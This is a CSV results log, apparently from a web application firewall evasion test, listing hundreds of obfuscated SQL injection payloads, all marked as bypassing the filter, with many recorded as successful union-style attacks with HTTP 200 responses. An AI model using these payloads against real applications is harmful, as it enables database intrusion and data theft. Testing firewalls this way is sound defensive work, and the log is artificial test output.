Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.018,71.54,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0135,71.54,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0126,71.54,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.016,71.54,No,200
0'||%0b!@<@.+or,Bypassed,No,None,Unknown,0.0178,71.54,No,500
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0203,71.54,No,200
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0191,71.54,No,200
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.02,71.54,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0153,71.54,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0094,71.54,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0131,71.54,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0134,71.54,No,500
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0145,71.54,No,200
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0161,71.54,No,500
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0216,71.54,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0118,71.56,No,200
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0157,71.62,No,200
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0151,71.65,No,200
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0145,71.65,No,500
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,71.65,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0106,71.65,No,500
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0116,71.65,No,500
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.016,71.65,No,500
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0111,71.65,No,500
0'<@=1+or+,Bypassed,No,None,Unknown,0.0114,71.65,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0299,71.65,No,500
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0134,71.65,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0176,71.65,No,200
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0153,71.65,No,500
0'<@=1%0b||%0b,Bypassed,No,None,Unknown,0.016,71.54,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0081,71.54,No,500
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0167,71.54,No,500
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0139,71.54,No,500
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0221,71.54,No,200
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0172,71.54,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0301,71.54,No,200
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0126,71.54,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0106,71.54,No,200
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0155,71.54,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0167,71.54,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0228,71.54,No,200
0%27or+1<@.%0bor,Bypassed,Yes,unionAtk,Unknown,0.0141,71.54,No,200
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.011,71.54,No,200
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0279,71.54,No,500
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0112,71.54,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0119,71.54,No,200
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0146,71.54,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0192,71.54,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0171,71.54,No,200
0'<@=1%0bor+,Bypassed,No,None,Unknown,0.0135,71.54,No,500
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.0096,71.54,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0159,71.54,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0097,71.54,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0185,71.54,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0089,71.54,No,200
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0166,71.54,No,500
0%27||+@<@.%0b||,Bypassed,Yes,unionAtk,Unknown,0.0096,71.54,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0104,71.54,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0143,71.54,No,200
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0158,71.54,No,500
0'<@=.1+or+,Bypassed,No,None,Unknown,0.0092,71.54,No,500
0'<@!=1%0b||%0b,Bypassed,No,None,Unknown,0.0117,71.54,No,500
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0114,71.54,No,200
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0103,71.54,No,200
0'<@=1.+||+,Bypassed,No,None,Unknown,0.0113,71.54,No,500
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0118,71.54,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.013,71.54,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0154,71.62,No,200
0%27<@=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0068,71.65,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0161,71.65,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0141,71.65,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0177,71.65,No,500
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0111,71.65,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0104,71.65,No,200
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0093,71.65,No,200
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0111,71.65,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.024,71.65,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0127,71.65,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0104,71.65,No,500
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0153,71.54,No,200
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0116,71.54,No,500
0%27<@=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0264,71.54,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0148,71.54,No,500
0%27<@!=1+or+,Bypassed,Yes,unionAtk,Unknown,0.0186,71.54,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0218,71.54,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0169,71.54,No,200
0%27or+@<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0135,71.54,No,200
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0149,71.54,No,200
0'<@!=.1+or+,Bypassed,No,None,Unknown,0.0162,71.54,No,500
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0138,71.54,No,200
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0106,71.54,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0172,71.54,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0206,71.54,No,200
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0215,71.54,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0166,71.54,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0148,71.54,No,200
0'<@=1.%0bor%0b,Bypassed,No,None,Unknown,0.0188,71.54,No,500
0%27<@=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0375,71.54,No,200
0%27or+!@<@.%0bor,Bypassed,Yes,unionAtk,Unknown,0.0188,71.54,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0162,71.54,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0167,71.54,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0158,71.54,No,200
0%27<@=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0136,71.54,No,200
0%27<@!=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0108,71.54,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0125,71.54,No,200
0'<@!=1+||%0b,Bypassed,No,None,Unknown,0.0124,71.54,No,500
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0136,71.54,No,500
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0089,71.54,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.009,71.54,No,500
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.014,71.56,No,500
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0089,71.62,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0126,71.65,No,200
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0146,71.65,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0092,71.65,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.012,71.65,No,500
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0146,71.65,No,200
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0126,71.65,No,200
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0106,71.65,No,500
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0093,71.65,No,200
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0082,71.65,No,200
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0182,71.65,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0095,71.65,No,500
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0168,71.65,No,500
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0098,71.65,No,500
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0105,71.65,No,200
0%27<@!=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0148,71.65,No,200
9'%0b||%0b,Bypassed,No,None,Unknown,0.0135,71.65,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.014,71.65,No,200
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0159,71.65,No,500
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0203,71.65,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0177,71.65,No,200
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0134,71.65,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.018,71.65,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0138,71.65,No,500
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0144,71.65,No,200
0%27<@!=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0263,71.65,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0176,71.65,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0144,71.65,No,500
0'<@!=1.+||+,Bypassed,No,None,Unknown,0.0163,71.65,No,500
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0207,71.65,No,200
0'<@!=1+||+,Bypassed,No,None,Unknown,0.0122,71.65,No,500
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0157,71.65,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0123,71.65,No,500
0%27<@=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0192,71.65,No,200
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0185,71.65,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0186,71.65,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0174,71.65,No,200
0%27<@=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0212,71.65,No,200
0'<@=1+or%0b,Bypassed,No,None,Unknown,0.013,71.65,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0117,71.65,No,200
0%27<@=1.%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0202,71.65,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0106,71.65,No,500
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.025,71.65,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0186,71.65,No,200
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0121,71.65,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0103,71.65,No,500
0'<@!=1%0b||%0b,Bypassed,No,None,Unknown,0.0157,71.65,No,500
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.018,71.65,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0125,71.65,No,500
0%27or+!@<@.%0b||,Bypassed,Yes,unionAtk,Unknown,0.0188,71.65,No,200
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0243,71.65,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0146,71.65,No,200
0'<@=1.+||%0b,Bypassed,No,None,Unknown,0.0165,71.65,No,500
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0177,71.65,No,200
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0191,71.65,No,200
0%27<@!=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0143,71.65,No,200
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0102,71.65,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0172,71.65,No,500
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0125,71.65,No,500
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.016,71.65,No,200
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0167,71.65,No,500
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0144,71.65,No,500
0%27<@=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0094,71.65,No,200
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0114,71.65,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0104,71.65,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0115,71.65,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0134,71.65,No,200
0%27<@!=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0164,71.65,No,200
0%27||%0b1<@.+||,Bypassed,Yes,unionAtk,Unknown,0.0199,71.65,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0106,71.65,No,200
0'<@=.1+or%0b,Bypassed,No,None,Unknown,0.0093,71.65,No,500
0'<@!=1%0bor+,Bypassed,No,None,Unknown,0.0143,71.65,No,500
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.0138,71.65,No,200
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0227,71.65,No,200
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0124,71.65,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0215,71.65,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0166,71.65,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0137,71.65,No,500
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0228,71.65,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.0117,71.65,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.038,71.65,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0136,71.65,No,500
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0169,71.65,No,200
0'||%0b1<@.+or,Bypassed,No,None,Unknown,0.0169,71.65,No,500
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0127,71.65,No,500
0'<@=1+||+,Bypassed,No,None,Unknown,0.0173,71.65,No,500
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0144,71.65,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0212,71.65,No,500
0%27<@!=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0131,71.65,No,200
0'<@!=.1+or%0b,Bypassed,No,None,Unknown,0.0196,71.65,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0098,71.65,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0137,71.65,No,500
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0174,71.65,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0196,71.65,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0234,71.65,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0214,71.65,No,200
0'<@!=1.%0bor+,Bypassed,No,None,Unknown,0.0165,71.65,No,500
0%27<@=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0146,71.65,No,200
0%27<@!=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.013,71.65,No,200
0%27<@=.1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0275,71.65,No,200
0'<@!=1%0b||+,Bypassed,No,None,Unknown,0.0155,71.65,No,500
0'<@=.1%0b||%0b,Bypassed,No,None,Unknown,0.0151,71.65,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0217,71.65,No,200
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0142,71.65,No,200
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0089,71.65,No,200
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0194,71.65,No,200
0%27<@!=1.%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.014,71.65,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0176,71.65,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0096,71.65,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0118,71.65,No,200
0'<@!=1+or+,Bypassed,No,None,Unknown,0.0127,71.65,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0169,71.65,No,200
0%27<@!=1.+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0103,71.65,No,200
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0125,71.65,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0135,71.65,No,200
0%27or+@<@.+||,Bypassed,Yes,unionAtk,Unknown,0.0121,71.65,No,200
0'<@=1%0b||%0b,Bypassed,No,None,Unknown,0.0183,71.65,No,500
0'<@=1+||+,Bypassed,No,None,Unknown,0.0164,71.65,No,500
0%27<@=1.%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0162,71.65,No,200
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0122,71.65,No,200
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.0113,71.65,No,500
0'<@=.1%0bor+,Bypassed,No,None,Unknown,0.0168,71.65,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0108,71.65,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0172,71.65,No,200
0%27<@!=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0177,71.65,No,200
0%27<@!=1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.0101,71.65,No,200
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0152,71.65,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0228,71.65,No,500
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0191,71.65,No,500
0'<@=1.%0bor+,Bypassed,No,None,Unknown,0.0262,71.65,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0215,71.65,No,200
0'<@=.1+||+,Bypassed,No,None,Unknown,0.0188,71.65,No,500
0'<@!=.1%0b||%0b,Bypassed,No,None,Unknown,0.0216,71.65,No,500
0%27or+@<@.+||,Bypassed,Yes,unionAtk,Unknown,0.0118,71.65,No,200
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0235,71.65,No,500
0%27<@=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0159,71.65,No,200
0'<@=1+or+,Bypassed,No,None,Unknown,0.018,71.65,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0144,71.65,No,200
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.0169,71.65,No,500
0%27<@!=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0191,71.65,No,200
0'||%0b!@<@.+or,Bypassed,No,None,Unknown,0.0229,71.65,No,500
0'<@!=.1+||+,Bypassed,No,None,Unknown,0.0156,71.65,No,500
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0205,71.65,No,200
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0139,71.65,No,200
0%27<@!=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0149,71.65,No,200
0%27<@=1.%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0164,71.65,No,200
0'<@=1%0bor%0b,Bypassed,No,None,Unknown,0.0235,71.65,No,500
0%27<@!=.1%0b||%0b,Bypassed,Yes,unionAtk,Unknown,0.017,71.65,No,200
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0161,71.65,No,500
0%27<@=1.+||+,Bypassed,Yes,unionAtk,Unknown,0.0225,71.65,No,200
0%27or%0b1<@.+or,Bypassed,Yes,unionAtk,Unknown,0.0105,71.65,No,200
0'<@=1.+or+,Bypassed,No,None,Unknown,0.0149,71.65,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0168,71.65,No,500
0'<@!=1+or%0b,Bypassed,No,None,Unknown,0.0186,71.65,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0233,71.65,No,500
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0129,71.65,No,200
0'<@!=1.+||%0b,Bypassed,No,None,Unknown,0.0137,71.65,No,500
0'<@=.1%0bor%0b,Bypassed,No,None,Unknown,0.0185,71.65,No,500
0%27<@!=1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.013,71.65,No,200
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0117,71.65,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0143,71.65,No,200
0%27or+!@<@+or,Bypassed,Yes,unionAtk,Unknown,0.0191,71.65,No,200
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0165,71.65,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0139,71.65,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0135,71.65,No,500
0'<@!=.1%0bor%0b,Bypassed,No,None,Unknown,0.0123,71.65,No,500
0'<@!=1.%0b||+,Bypassed,No,None,Unknown,0.0125,71.65,No,500
0'<@=1.%0b||+,Bypassed,No,None,Unknown,0.013,71.65,No,500
0'<@=1%0b||+,Bypassed,No,None,Unknown,0.0153,71.65,No,500
0%27<@=.1%0b||+,Bypassed,Yes,unionAtk,Unknown,0.0183,71.65,No,200
0%27<@!=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0132,71.65,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.016,71.65,No,200
0%27<@!=1.+or+,Bypassed,Yes,unionAtk,Unknown,0.0207,71.65,No,200
0'<@!=1.+or%0b,Bypassed,No,None,Unknown,0.0203,71.65,No,500
0'<@!=.1+||%0b,Bypassed,No,None,Unknown,0.0173,71.65,No,500
0'<@!=1.%0bor%0b,Bypassed,No,None,Unknown,0.0088,71.65,No,500
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0199,71.65,No,200
0'||%0b@<@+or,Bypassed,No,None,Unknown,0.0213,71.65,No,500
0%27<@!=.1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0308,71.65,No,200
0%27<@!=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0188,71.65,No,200
0%27||%0b!@<@+||,Bypassed,Yes,unionAtk,Unknown,0.014,71.65,No,200
0%27<@=1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0245,71.65,No,200
0'<@!=1.%0b||%0b,Bypassed,No,None,Unknown,0.0219,71.65,No,500
0%27<@=1+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0156,71.65,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.0132,71.65,No,500
0'<@!=.1%0b||+,Bypassed,No,None,Unknown,0.013,71.65,No,500
0'<@!=.1%0bor+,Bypassed,No,None,Unknown,0.0115,71.65,No,500
0'<@=1.%0b||%0b,Bypassed,No,None,Unknown,0.0189,71.65,No,500
0%27<@=1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0235,71.65,No,200
0%27<@!=.1+||+,Bypassed,Yes,unionAtk,Unknown,0.011,71.65,No,200
0%27<@=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0187,71.65,No,200
0%27<@=1.+or%0b,Bypassed,Yes,unionAtk,Unknown,0.0159,71.65,No,200
0%27<@=.1%0bor+,Bypassed,Yes,unionAtk,Unknown,0.0171,71.65,No,200
0%27<@=.1%0bor%0b,Bypassed,Yes,unionAtk,Unknown,0.0244,71.65,No,200
0%27<@=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0288,71.65,No,200
0'<@=1+||%0b,Bypassed,No,None,Unknown,0.0238,71.65,No,500
0%27<@!=.1+or+,Bypassed,Yes,unionAtk,Unknown,0.0165,71.65,No,200
0%27<@!=1+||+,Bypassed,Yes,unionAtk,Unknown,0.0193,71.65,No,200
0'<@!=1.+or+,Bypassed,No,None,Unknown,0.015,71.65,No,500
0'<@=.1+||%0b,Bypassed,No,None,Unknown,0.0244,71.65,No,500
0%27<@=1+||%0b,Bypassed,Yes,unionAtk,Unknown,0.0145,71.65,No,200
